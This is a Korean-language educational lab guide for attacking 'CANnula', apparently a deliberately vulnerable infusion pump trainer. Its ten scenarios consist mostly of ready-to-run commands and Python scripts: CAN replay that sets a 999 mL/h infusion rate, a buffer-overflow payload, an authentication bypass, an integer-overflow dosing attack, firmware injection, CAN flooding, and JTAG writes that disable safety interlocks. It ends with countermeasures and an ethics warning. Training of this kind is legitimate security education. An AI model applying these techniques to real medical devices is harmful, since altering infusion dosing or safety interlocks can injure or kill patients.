# CANnula 해킹 시나리오 가이드

교육용 보안 실습 시나리오 모음

## 시나리오 1: CAN 버스 스니핑 및 리플레이 공격

### 목표
CAN 버스의 트래픽을 모니터링하고 정상 명령을 리플레이하여 펌프를 제어

### 도구
- candump, cansniffer (can-utils)
- Wireshark with CAN plugin
- Python + python-can

### 실습
```bash
# 1. CAN 트래픽 모니터링
candump -l can0

# 2. 텔레메트리 메시지 관찰 (ID: 0x200)
candump can0 | grep "200"

# 3. SET_RATE 명령 캡처 후 리플레이
# 정상 명령: 50 mL/h 설정
cansend can0 100#3200000064000100

# 4. 위험한 속도로 변경 (999 mL/h)
cansend can0 100#E703000064000100
```

### 취약점
- CAN 메시지에 인증 없음
- 시퀀스 번호나 타임스탬프 없음
- 암호화되지 않은 평문 통신

## 시나리오 2: 버퍼 오버플로우를 통한 코드 실행

### 목표
디버그 명령 핸들러의 버퍼 오버플로우를 이용한 임의 코드 실행

### 도구
- GDB + OpenOCD
- Python 익스플로잇 스크립트

### 실습
```python
import can
import struct

# CAN 버스 초기화
bus = can.Bus(interface='socketcan', channel='can0')

# 오버플로우 페이로드 생성
payload = b'A' * 32  # 버퍼 채우기
payload += struct.pack('<I', 0x20000000)  # 리턴 주소 덮어쓰기
payload += b'\x00\x00\x00\x00'  # 패딩

# 디버그 명령으로 전송
msg = can.Message(
    arbitration_id=0x130,
    data=payload[:8],  # 첫 8바이트
    is_extended_id=False
)
bus.send(msg)

# 나머지 페이로드 전송 (여러 프레임)
for i in range(8, len(payload), 8):
    chunk = payload[i:i+8]
    msg = can.Message(arbitration_id=0x130, data=chunk)
    bus.send(msg)
```

### 취약점
- strcpy() 사용으로 인한 버퍼 오버플로우
- 스택 보호 메커니즘 없음
- 실행 가능한 스택 (NX bit 없음)

## 시나리오 3: 인증 우회 및 권한 상승

### 목표
약한 인증 메커니즘을 우회하여 관리자 권한 획득

### 실습
```bash
# UART 콘솔에서

# 1. 직접 권한 레벨 설정
set auth 2

# 2. 서비스 모드 진입 (부분 패스워드 매칭)
svc

# 3. 백도어 약물 사용
set drug 6

# CAN으로 인증 우회
cansend can0 120#FF00000000000000
```

### 취약점
- 하드코딩된 패스워드
- 8비트 인증 토큰
- 부분 문자열 매칭
- 전역 권한 변수 직접 접근

## 시나리오 4: 정수 오버플로우를 통한 용량 조작

### 목표
계산 로직의 정수 오버플로우를 이용한 위험한 용량 주입

### 실습
```python
# 정수 오버플로우 유발
rate = 65535  # uint16_t 최대값
weight = 255  # uint8_t 최대값

# rate * weight = 16,711,425 (오버플로우)
msg_data = struct.pack('<HHHHB', rate, 1000, 1, weight, 0)
msg = can.Message(arbitration_id=0x100, data=msg_data)
bus.send(msg)
```

### 취약점
- 부호 없는 정수 오버플로우
- 범위 검증 없음
- 단위 변환 시 정밀도 손실

## 시나리오 5: 메모리 덤프를 통한 정보 누출

### 목표
메모리 직접 접근 기능을 악용하여 민감한 정보 획득

### 실습
```python
# 플래시 메모리 덤프 (패스워드 찾기)
def dump_memory(address, length):
    msg_data = struct.pack('<IH', address, length)
    msg = can.Message(
        arbitration_id=0x110,
        data=[0x06, 0x00] + list(msg_data)
    )
    bus.send(msg)
    
# 플래시 영역 덤프
dump_memory(0x08000000, 256)  # 플래시 시작
dump_memory(0x20000000, 256)  # RAM 시작

# UART 콘솔에서
dump  # 하드코딩된 시크릿 출력
```

### 취약점
- 메모리 접근 제어 없음
- 민감한 데이터 평문 저장
- 디버그 정보 노출

## 시나리오 6: DoS (서비스 거부) 공격

### 목표
CAN 버스 플러딩으로 정상 동작 방해

### 실습
```bash
# CAN 버스 플러딩
while true; do
    cansend can0 000#FFFFFFFFFFFFFFFF
done

# 에러 프레임 주입
cangen can0 -g 0 -I 0x700 -L 8 -D r

# 재귀 함수 트리거 (스택 고갈)
cansend can0 130#7265637572736976
```

### 취약점
- CAN 메시지 처리 속도 제한 없음
- 재귀 깊이 제한 약함
- 에러 처리 미흡

## 시나리오 7: 펌웨어 변조 공격

### 목표
서명 검증 없는 펌웨어 업데이트 메커니즘 악용

### 실습
```python
# 악성 펌웨어 청크 전송
def send_firmware_chunk(chunk_id, data):
    msg_data = struct.pack('<HHI', chunk_id, 100, 0x12345678)
    msg_data += data[:48]  # 48바이트 데이터
    
    msg = can.Message(arbitration_id=0x140, data=msg_data[:8])
    bus.send(msg)
    
    # 여러 프레임으로 나누어 전송
    for i in range(8, len(msg_data), 8):
        msg = can.Message(arbitration_id=0x140, data=msg_data[i:i+8])
        bus.send(msg)

# 쉘코드 주입
shellcode = b'\x00\x00\x00\x00' * 12  # NOP sled
send_firmware_chunk(0, shellcode)
```

### 취약점
- CRC만으로 무결성 검증
- 디지털 서명 없음
- 부트로더 보호 없음

## 시나리오 8: 레이스 컨디션 익스플로잇

### 목표
FreeRTOS 태스크 간 동기화 문제를 이용한 상태 조작

### 실습
```python
import threading
import time

def send_start():
    msg = can.Message(arbitration_id=0x110, data=[0x01, 0x00]*4)
    bus.send(msg)

def send_stop():
    msg = can.Message(arbitration_id=0x110, data=[0x02, 0x00]*4)
    bus.send(msg)

# 동시에 시작/정지 명령 전송
threads = []
for _ in range(10):
    t1 = threading.Thread(target=send_start)
    t2 = threading.Thread(target=send_stop)
    threads.extend([t1, t2])

for t in threads:
    t.start()
```

### 취약점
- 뮤텍스 보호 불완전
- 전역 상태 변수 동시 접근
- 우선순위 역전 문제

## 시나리오 9: 포맷 스트링 공격

### 목표
sprintf() 취약점을 이용한 메모리 읽기/쓰기

### 실습
```bash
# UART 콘솔에서

# 스택 정보 누출
%x %x %x %x

# 메모리 주소 읽기
%s

# 메모리 쓰기 (위험!)
%n
```

### 취약점
- sprintf(buffer, user_input) 패턴
- 포맷 스트링 검증 없음

## 시나리오 10: 하드웨어 디버깅 인터페이스 공격

### 목표
SWD/JTAG를 통한 직접 메모리 접근

### 도구
- OpenOCD
- GDB
- ST-Link

### 실습
```bash
# OpenOCD 연결
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg

# GDB 연결
arm-none-eabi-gdb
target remote localhost:3333
monitor reset halt

# 메모리 읽기
x/100x 0x20000000

# 변수 변경
set g_AuthLevel = 2
set g_SafetyInterlockBypassed = 1

# 플래시 덤프
dump binary memory flash.bin 0x08000000 0x08010000
```

### 취약점
- RDP (Read Protection) 미설정
- 디버그 인터페이스 활성화
- JTAG/SWD 핀 접근 가능

## 방어 대책 (실제 제품에서)

1. **CAN 보안**
   - CAN-FD 사용
   - 메시지 인증 코드 (MAC)
   - 암호화 (AES)
   - 안티-리플레이 (시퀀스 번호)

2. **메모리 보호**
   - MPU 활성화
   - 스택 카나리
   - ASLR
   - NX bit

3. **인증 강화**
   - 강력한 암호화 키
   - 챌린지-응답 인증
   - 세션 관리

4. **코드 보안**
   - 안전한 함수 사용 (strncpy vs strcpy)
   - 입력 검증
   - 범위 체크

5. **하드웨어 보호**
   - RDP Level 2
   - 안티-템퍼링
   - 시큐어 부트

## 윤리적 고려사항

⚠️ 이 시나리오들은 **교육 목적**으로만 사용하세요.
- 절대 실제 의료 기기에 시도하지 마세요
- 격리된 환경에서만 실습하세요
- 발견한 취약점은 책임있게 보고하세요